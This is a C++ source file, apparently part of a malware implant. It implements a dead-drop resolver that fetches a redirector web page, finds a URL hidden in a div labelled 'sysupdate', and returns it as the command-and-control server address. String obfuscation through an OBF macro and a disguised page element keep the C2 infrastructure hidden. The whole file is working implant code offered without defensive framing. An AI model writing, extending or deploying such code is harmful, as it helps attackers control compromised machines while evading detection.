#include "RedirectorResolver.h"
#ifdef _WIN32
#include "WinHttpClient.h"
#else
#include "HttpClient.h"
#include <iostream>
#endif
#include "../core/Config.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include <regex>
#include <stdexcept>
namespace http {
RedirectorResolver::RedirectorResolver(const std::string& redirectorUrl) : redirectorUrl_(redirectorUrl) {}
std::string RedirectorResolver::resolve() {
    std::string server, path;
    std::regex urlParseRegex(R"(https?://([^/]+)(/.*))");
    std::smatch urlMatch;
    if (std::regex_search(redirectorUrl_, urlMatch, urlParseRegex)) {
        server = urlMatch[1].str();
        path = urlMatch[2].str();
    } else throw std::runtime_error(OBF("Failed to parse redirector URL: ") + redirectorUrl_);
    std::string html;
#ifdef _WIN32
    std::wstring wserver(server.begin(), server.end());
    std::wstring wpath(path.begin(), path.end());
    WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
    html = client.get(wserver, wpath);
#else
    HttpClient client(core::USER_AGENTS[0]);
    html = client.get(server, path);
#endif

    if (getenv("CI")) {
        LOG_INFO("Redirector response body size: " + std::to_string(html.size()));
    }

    // Use a more relaxed regex for finding the div
    std::regex divRegex("id\\s*=\\s*[\"']sysupdate[\"'][^>]*>([\\s\\S]*?)</div>", std::regex::icase);
    std::smatch match;
    if (!std::regex_search(html, match, divRegex)) {
        if (getenv("CI")) LOG_ERR("sysupdate div not found in HTML. Body preview: " + html.substr(0, 100));
        throw std::runtime_error(OBF("C2 URL not found in redirector page."));
    }
    std::string content = match[1].str();
    std::regex urlRegex(OBF("https?://[^\\s\"'<>]+"));
    if (std::regex_search(content, match, urlRegex)) return match[0].str();
    throw std::runtime_error(OBF("No valid URL found in sysupdate div."));
}
}
